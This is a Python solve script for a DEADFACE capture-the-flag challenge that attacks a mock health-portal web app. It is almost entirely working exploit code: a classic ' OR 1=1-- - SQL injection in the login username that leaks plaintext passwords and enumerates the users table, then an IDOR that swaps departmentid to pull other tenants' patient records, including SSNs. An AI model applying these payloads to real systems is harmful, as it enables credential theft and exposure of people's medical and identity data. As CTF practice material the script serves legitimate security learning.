#!/usr/bin/env python3
"""
DEADFACE CTF - RP-01 "Real Pain in the Prostate"
Health Spark Employer Portal - full automated solve.

Chain:
  1. Source-comment recon on /dashboard            -> recon flag
  2. SQL injection in POST /api/login (username)   -> credentials + SQLi flag
  3. Broken object-level authorization on
     POST /api/patients (departmentid in body)     -> IDOR flag

Usage:
    python solve.py [base_url]

Dependencies: Python 3.8+ standard library only.
"""

import json
import re
import sys
import urllib.request
import urllib.error

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://45.79.200.170:3000"
FLAG_RE = re.compile(r"deadface\{[^}]+\}")


# ----------------------------------------------------------------------------- http
def request(path, data=None, token=None, method=None):
    """Return (status, body_text). Never raises on HTTP error status."""
    url = BASE + path
    body = json.dumps(data).encode() if data is not None else None
    req = urllib.request.Request(url, data=body, method=method or ("POST" if body else "GET"))
    if body:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def post_json(path, data, token=None):
    status, text = request(path, data, token)
    try:
        return status, json.loads(text)
    except json.JSONDecodeError:
        return status, {"_raw": text}


# ----------------------------------------------------------------------------- stage 1
def stage_recon():
    """The dashboard ships a flag in an HTML comment."""
    print("[*] Stage 1 - recon /dashboard")
    _, html = request("/dashboard")
    m = FLAG_RE.search(html)
    if m:
        print("    [+] recon flag: %s" % m.group(0))
        return m.group(0)
    print("    [-] no flag in dashboard source")
    return None


# ----------------------------------------------------------------------------- stage 2
def stage_sqli():
    """
    POST /api/login interpolates the username into a SQLite query and, when the
    password check fails, still echoes the matched row back (HTTP 200, no token).

    `' OR 1=1-- -` makes the WHERE clause always true, so the first row of the
    users table comes back verbatim - including the plaintext password.
    """
    print("[*] Stage 2 - SQL injection on /api/login")
    status, data = post_json("/api/login", {"username": "' OR 1=1-- -", "password": "x"})
    if not data.get("username"):
        print("    [-] injection failed: %s" % data)
        return None, None, None

    print("    [+] leaked row: %s / %s (dept %s, role %s)"
          % (data["username"], data["password"], data.get("departmentid"), data.get("role")))
    sqli_flag = data.get("flag")
    if sqli_flag:
        print("    [+] SQLi flag: %s" % sqli_flag)

    # Enumerate the rest of the table: exclude the users we already have and let
    # the injected WHERE clause hand back the next row.
    users, seen = [], set()
    payload = "' OR 1=1-- -"
    for _ in range(20):
        _, row = post_json("/api/login", {"username": payload, "password": "x"})
        name = row.get("username")
        if not name or name in seen:          # empty username / table exhausted
            break
        seen.add(name)
        users.append(row)
        quoted = ",".join("'%s'" % u for u in seen)
        payload = "' OR username NOT IN (%s)-- -" % quoted

    print("    [+] users table (%d rows):" % len(users))
    for u in users:
        print("        %-16s %-22s dept %-6s role %s"
              % (u["username"], u["password"], u.get("departmentid"), u.get("role")))
    return data["username"], data["password"], users


# ----------------------------------------------------------------------------- stage 3
def stage_idor(username, password, users):
    """
    The dashboard posts departmentid from sessionStorage and the server trusts it.
    Nothing ties it to the departmentid inside the JWT, so any authenticated
    employer can read any other employer's members.
    """
    print("[*] Stage 3 - IDOR on /api/patients")
    status, login = post_json("/api/login", {"username": username, "password": password})
    token = login.get("token")
    if not token:
        print("    [-] could not log in: %s" % login)
        return None
    own_dept = login.get("departmentid")
    print("    [+] authenticated as %s (own dept %s)" % (username, own_dept))

    # Every department referenced by a user that is not our own is fair game.
    targets = sorted({u.get("departmentid") for u in users or []} - {own_dept, None})
    if not targets:
        targets = [18432]
    print("    [*] other departments to try: %s" % targets)

    for dept in targets:
        status, data = post_json("/api/patients", {
            "departmentid": dept,
            "FirstNameFilter": "",
            "LastNameFilter": "",
            "take": None,
            "skip": 0,
        }, token=token)
        rows = data.get("totalRows")
        print("    [*] dept %-6s -> HTTP %s, %s members" % (dept, status, rows))
        if not rows:
            continue
        for m in data.get("members", []):
            hit = FLAG_RE.search(str(m.get("diagnosis", "")))
            if hit:
                print("    [+] %s (%s, SSN %s) -> %s"
                      % (m["name"], m["memberId"], m["ssn"], hit.group(0)))
                return hit.group(0)
    print("    [-] no flag in reachable departments")
    return None


# ----------------------------------------------------------------------------- main
def main():
    print("=" * 70)
    print(" RP-01 - Health Spark Employer Portal")
    print(" target: %s" % BASE)
    print("=" * 70)

    flags = []
    recon = stage_recon()
    if recon:
        flags.append(("recon (dashboard source)", recon))

    username, password, users = stage_sqli()
    if users:
        sqli_flag = users[0].get("flag")
        if sqli_flag:
            flags.append(("SQL injection", sqli_flag))
    if username and password:
        idor = stage_idor(username, password, users)
        if idor:
            flags.append(("IDOR (cross-tenant records)", idor))

    print("\n" + "=" * 70)
    print(" FLAGS")
    print("=" * 70)
    for stage, flag in flags:
        print("  %-30s %s" % (stage, flag))
    if flags:
        print("\n  >>> SUBMIT: %s" % flags[-1][1])
    print("=" * 70)


if __name__ == "__main__":
    main()
